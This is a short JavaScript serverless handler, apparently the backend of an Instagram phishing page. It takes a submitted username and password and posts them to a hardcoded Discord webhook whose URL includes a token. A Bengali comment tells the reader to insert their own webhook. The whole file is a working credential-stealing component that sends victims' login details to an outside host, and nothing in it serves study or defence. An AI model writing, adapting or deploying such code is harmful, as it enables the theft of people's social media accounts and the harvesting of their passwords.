export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, password } = req.body;
  const webhookUrl = 'https://discord.com/api/webhooks/1574410099294732320/yVIpbgS7Zz1WJpP6PPuZiG_gB796XDrJAgpqri6DoPJkcEsS9HocqYmBoqK_a31101pB'; // এখানে তোমার webhook বসাও

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `Instagram Username: ${username} Pass: ${password}`
      })
    });

    if (!response.ok) throw new Error('Discord webhook failed');
    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to send' });
  }
}
